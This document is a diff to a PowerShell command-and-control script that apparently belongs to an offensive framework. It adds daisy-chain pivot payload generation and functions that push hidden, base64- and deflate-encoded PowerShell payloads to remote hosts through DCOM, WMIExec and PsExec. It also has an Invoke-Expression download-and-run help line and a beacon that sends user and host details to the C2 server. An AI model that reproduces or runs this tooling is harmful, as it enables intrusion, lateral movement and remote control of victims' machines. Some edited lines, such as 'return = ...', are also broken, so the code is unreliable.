@@ -43,7 +43,8 @@ function Implant-Handler
     $IPAddress = $c2serverresults.HostnameIP 
     $DomainFrontHeader = $c2serverresults.DomainFrontHeader 
     $ipv4address = $c2serverresults.HostnameIP
-    $serverport = $c2serverresults.ServerPort 
+    $serverport = $c2serverresults.ServerPort
+    $URLS =  $c2serverresults.URLS
         
 $head = '
 <style>
@@ -119,6 +120,7 @@ $header = '
 
             foreach ($implant in $dbresults) 
             { 
+                $pivotimplant = $null
                 $randomurihost = $implant.RandomURI
                 $implantid = $implant.ImplantID
                 $im_arch = $implant.Arch
@@ -128,15 +130,17 @@ $header = '
                 $im_pid = $implant.PID
                 $im_sleep = $implant.Sleep
                 $im_domain = $implant.Domain
+                $pivot = $implant.Pivot
+                if ($pivot -eq "YES"){$pivotimplant = " P"}
                 if ($randomurihost) {
                     if (((get-date).AddMinutes(-10) -gt $implant.LastSeen) -and ((get-date).AddMinutes(-59) -lt $implant.LastSeen)){
-                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)" -ForegroundColor Yellow
+                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)$($pivotimplant)" -ForegroundColor Yellow
                     }
                     elseif ((get-date).AddMinutes(-59) -gt $implant.LastSeen){
-                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)" -ForegroundColor Red
+                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)$($pivotimplant)" -ForegroundColor Red
                     }
                     else {
-                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)" -ForegroundColor Green
+                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)$($pivotimplant)" -ForegroundColor Green
                     } 
                 }
             }
@@ -436,7 +440,7 @@ $header = '
         write-host " LoadModule Inveigh.ps1" -ForegroundColor Green
         write-host " Invoke-Expression (Get-Webclient).DownloadString(`"https://module.ps1`")" -ForegroundColor Green
         write-host " StartAnotherImplant or SAI" -ForegroundColor Green 
-        write-host " Invoke-DaisyChain -daisyserver http://192.168.1.1 -port 80 -c2port 80 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass" -ForegroundColor Green
+        write-host " Invoke-DaisyChain -name dc1daisy -daisyserver http://192.168.1.1 -port 80 -c2port 80 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass" -ForegroundColor Green
         write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green
         write-host " Get-MSHotfixes" -ForegroundColor Green 
         write-host " Get-FireWallRulesAll | Out-String -Width 200" -ForegroundColor Green 
@@ -670,14 +674,10 @@ function CreateProxyPayload
 {
     param
     (
-        [Object]
-        $username,
-        [Object]
-        $password,
-        [Object]
-        $proxyurl
-    )
-                
+        [Parameter(Mandatory=$true)][AllowEmptyString()][string]$username,
+        [Parameter(Mandatory=$true)][AllowEmptyString()][string]$password,
+        [Parameter(Mandatory=$true)][string]$proxyurl
+    )        
     $command = createdropper -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl
     $payload = createrawpayload -command $command
     # create proxy payloads
@@ -687,22 +687,35 @@ function CreateProxyPayload
     CreateDLL -Proxy 1
 }
 function Invoke-DaisyChain {
-param($port, $daisyserver, $c2server, $c2port, $domfront, $proxyurl, $proxyuser, $proxypassword)
+param(
+
+[Parameter(Mandatory=$true)][string]$name, 
+[Parameter(Mandatory=$true)][string]$port, 
+[Parameter(Mandatory=$true)][string]$daisyserver,
+[Parameter(Mandatory=$true)][string]$c2server, 
+[Parameter(Mandatory=$true)][string]$c2port, 
+[Parameter(Mandatory=$true)][AllowEmptyString()][string]$domfront, 
+[Parameter(Mandatory=$true)][AllowEmptyString()][string]$proxyurl, 
+[Parameter(Mandatory=$true)][AllowEmptyString()][string]$proxyuser, 
+[Parameter(Mandatory=$true)][AllowEmptyString()][string]$proxypassword)
 
 $daisycommand = '$serverhost="'+$daisyserver+'"
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 $serverport='+$port+'
 $server=$serverhost+":"+$serverport
+$d = (Get-Date -Format "dd/MM/yyyy")
+$d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null)
+$k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null)
+if ($k -lt $d) {exit} 
 function Get-Webclient ($Cookie) {
-$wc = New-Object System.Net.WebClient; 
-$wc.UseDefaultCredentials = $true; 
-$wc.Proxy.Credentials = $wc.Credentials;
+$wc = New-Object System.Net.WebClient
+$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy() 
 if ($cookie) {
 $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
 $wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
 } $wc }
 function primer {
-$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$env:username;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
+$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$env:username;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;$server")
 $p64 = [Convert]::ToBase64String($pre)
 $pm = (Get-Webclient -Cookie $p64).downloadstring("$server/daisy")
 $pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
@@ -735,6 +748,8 @@ if (`$h) {`$wc.Headers.Add("Host",`$h)}
 if (`$proxyurl) {
 `$wp = New-Object System.Net.WebProxy(`$proxyurl,`$true); 
 `$wc.Proxy = `$wp;
+} else {
+`$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
 }
 if (`$username -and `$password) {
 `$PSS = ConvertTo-SecureString `$password -AsPlainText -Force; 
@@ -759,7 +774,7 @@ if (`$cookie) {
 <address>Apache (Debian) Server</address>
 </body></html>
 '
-`$URLS = "/connect","/daisy","/images/static/content/","/news/id=","/webapp/static/","/images/prints/","/wordpress/site/","/steam/","/true/images/77/static/","/holdings/office/images/"
+`$URLS = $($URLS),"/connect","/daisy"
 `$listener = New-Object -TypeName System.Net.HttpListener 
 `$listener.Prefixes.Add("http://+:`$serverport/") 
 `$listener.Start()
@@ -823,7 +838,7 @@ while (`$listener.IsListening)
 "@
 
 $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($fdsf)
-
+$fdsf | out-file c:\temp\test.txt
 $CompressedStream = New-Object IO.MemoryStream
 $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
 $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
@@ -838,35 +853,24 @@ $bytes = [System.Text.Encoding]::Unicode.GetBytes($daisycommand)
 $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
 $payload = $payloadraw -replace "`n", ""
 
-if (-not (Test-Path "$FolderPath\payloads\daisypayload.bat")){
-    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload.bat", $payload)
-    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload.bat"  -ForegroundColor Green
-} 
-elseif (-not (Test-Path "$FolderPath\payloads\daisypayload2.bat")){
-    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload2.bat", $payload)
-    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload2.bat"  -ForegroundColor Green
-}
-elseif (-not (Test-Path "$FolderPath\payloads\daisypayload3.bat")){
-    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload3.bat", $payload)
-    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload3.bat"  -ForegroundColor Green
-}
-elseif (-not (Test-Path "$FolderPath\payloads\daisypayload4.bat")){
-    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload4.bat", $payload)
-    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload4.bat"  -ForegroundColor Green
-} else {
-    Write-Host "Cannot create payload"
-}
+[IO.File]::WriteAllLines("$FolderPath\payloads\$($name).bat", $payload)
+Write-Host -Object "Payload written to: $FolderPath\payloads\$($name).bat"  -ForegroundColor Green
+
 $rundaisy = @"
 `$t = Invoke-Netstat| ? {`$_.ListeningPort -eq $port}
 if (!`$t) { 
     if (Test-Administrator) { 
-        start-job -ScriptBlock {$NewScript} | Out-Null 
+        `$MaxThreads = 5
+        `$RunspacePool = [RunspaceFactory]::CreateRunspacePool(1, `$MaxThreads)
+        `$RunspacePool.Open()
+        `$Jobs = @()
+        `$Job = [powershell]::Create().AddScript({$NewScript})
+        `$Job.RunspacePool = `$RunspacePool
+        `$Job.BeginInvoke() | Out-Null 
     }
 }
 
 "@
-[IO.File]::WriteAllLines("$FolderPath\payloads\daisyserver.ps1", $rundaisy)
-Write-Host -Object "DaisyServer written to: $FolderPath\payloads\daisyserver.ps1"  -ForegroundColor Green
 
 return $rundaisy
 }
@@ -1021,6 +1025,71 @@ function Del-Creds {
     }
 }
 
+function invoke-dcomdaisypayload {
+    param(
+    [Parameter(Mandatory=$true)][string]$target,
+    [Parameter(Mandatory=$true)][string]$name
+    )
+    if (Test-Path "$FolderPath\payloads\$($name).bat"){ 
+        $proxypayload = Get-Content -Path "$FolderPath\payloads\$($name).bat"
+        $pscommand = "`$c = [activator]::CreateInstance([type]::GetTypeFromProgID(`"MMC20.Application`",`"$target`")); `$c.Document.ActiveView.ExecuteShellCommand(`"C:\Windows\System32\cmd.exe`",`$null,`"/c $proxypayload`",`"7`")"
+        return $pscommand
+    } else {
+        write-host "Need to run Invoke-DaisyChain first"
+        return $null
+    }
+}
+function invoke-wmidaisypayload {
+    param(
+    [Parameter(Mandatory=$true)][string]$target,
+    [Parameter(Mandatory=$true)][string]$name,
+    [Parameter(Mandatory=$true)][string]$domain,
+    [Parameter(Mandatory=$true)][string]$user,
+    [Parameter(Mandatory=$false)][string]$pass,
+    [Parameter(Mandatory=$false)][string]$hash
+    )
+    if (Test-Path "$FolderPath\payloads\$($name).bat"){ 
+        CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
+        $proxypayload = Get-Content -Path "$FolderPath\payloads\$($name).bat"
+        $pscommand = $pscommand -replace 'Invoke-WMIDaisyPayload', 'Invoke-WMIExec'
+        return $pscommand + " -command '$proxypayload'"
+    } else {
+        write-host "Need to run Invoke-DaisyChain first"
+        return $null
+    }
+}
+function invoke-psexecdaisypayload {
+    param(
+    [Parameter(Mandatory=$true)][string]$target,
+    [Parameter(Mandatory=$true)][string]$name,
+    [Parameter(Mandatory=$true)][string]$domain,
+    [Parameter(Mandatory=$true)][string]$user,
+    [Parameter(Mandatory=$false)][string]$pass,
+    [Parameter(Mandatory=$false)][string]$hash
+    )
+
+    if (Test-Path "$FolderPath\payloads\$($name).bat"){ 
+        CheckModuleLoaded "Invoke-PsExec.ps1" $psrandomuri
+        $proxypayload = Get-Content -Path "$FolderPath\payloads\$($name).bat"
+        $pscommand = $pscommand -replace 'Invoke-PsExecDaisyPayload', 'Invoke-PsExec'
+        $proxypayload = $proxypayload -replace "powershell -exec bypass -Noninteractive -windowstyle hidden -e ", ""
+        $rawpayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($proxypayload))
+        $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($rawpayload)
+        $CompressedStream = New-Object IO.MemoryStream
+        $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+        $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
+        $DeflateStream.Dispose()
+        $CompressedScriptBytes = $CompressedStream.ToArray()
+        $CompressedStream.Dispose()
+        $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
+        $NewPayload = 'iex(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
+        return = $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
+    } else {
+        write-host "Need to run Invoke-DaisyChain first"
+        return $null
+    }
+}
+
 # run startup function
 startup
 
@@ -1159,32 +1228,18 @@ param
             }
             if ($pscommand.ToLower().StartsWith('invoke-dcomdaisypayload'))
             {
-                if (Test-Path "$FolderPath\payloads\daisypayload.bat"){ 
-                    $proxypayload = Get-Content -Path "$FolderPath\payloads\daisypayload.bat"
-                    $target = $pscommand -replace 'invoke-dcomdaisypayload -target ', ''
-                    $pscommand = "`$c = [activator]::CreateInstance([type]::GetTypeFromProgID(`"MMC20.Application`",`"$target`")); `$c.Document.ActiveView.ExecuteShellCommand(`"C:\Windows\System32\cmd.exe`",`$null,`"/c $proxypayload`",`"7`")"
-                } else {
-                    write-host "Need to run Invoke-DaisyChain first"
-                    $pscommand = $null
-                }
+                $pscommand = IEX $pscommand
             }
             if ($pscommand.ToLower().StartsWith('invoke-dcompayload'))
             {
+                   
                    $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                    $target = $pscommand -replace 'invoke-dcomdaisypayload -target ', ''
                    $pscommand = "`$c = [activator]::CreateInstance([type]::GetTypeFromProgID(`"MMC20.Application`",`"$target`")); `$c.Document.ActiveView.ExecuteShellCommand(`"C:\Windows\System32\cmd.exe`",`$null,`"/c $payload`",`"7`")"
             }
             if ($pscommand.ToLower().StartsWith('invoke-wmidaisypayload'))
             {
-                if (Test-Path "$FolderPath\payloads\daisypayload.bat"){ 
-                    CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
-                    $proxypayload = Get-Content -Path "$FolderPath\payloads\daisypayload.bat"
-                    $pscommand = $pscommand -replace 'Invoke-WMIDaisyPayload', 'Invoke-WMIExec'
-                    $pscommand = $pscommand + " -command '$proxypayload'"
-                } else {
-                    write-host "Need to run Invoke-DaisyChain first"
-                    $pscommand = $null
-                }
+                $pscommand = IEX $pscommand
             }            
             if ($pscommand.ToLower().StartsWith('invoke-wmipayload'))
             {
@@ -1223,26 +1278,7 @@ param
             }
             if ($pscommand.ToLower().StartsWith('invoke-psexecdaisypayload'))
             {
-                if (Test-Path "$FolderPath\payloads\daisypayload.bat"){ 
-                    CheckModuleLoaded "Invoke-PsExec.ps1" $psrandomuri
-                    $proxypayload = Get-Content -Path "$FolderPath\payloads\daisypayload.bat"
-                    $pscommand = $pscommand -replace 'Invoke-PsExecDaisyPayload', 'Invoke-PsExec'
-                    $proxypayload = $proxypayload -replace "powershell -exec bypass -Noninteractive -windowstyle hidden -e ", ""
-                    $rawpayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($proxypayload))
-                    $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($rawpayload)
-                    $CompressedStream = New-Object IO.MemoryStream
-                    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
-                    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
-                    $DeflateStream.Dispose()
-                    $CompressedScriptBytes = $CompressedStream.ToArray()
-                    $CompressedStream.Dispose()
-                    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
-                    $NewPayload = 'iex(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
-                    $pscommand = $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
-                } else {
-                    write-host "Need to run Invoke-DaisyChain first"
-                    $pscommand = $null
-                }
+                $pscommand = IEX $pscommand
             }
             if ($pscommand.ToLower().StartsWith('invoke-psexecpayload'))
             {
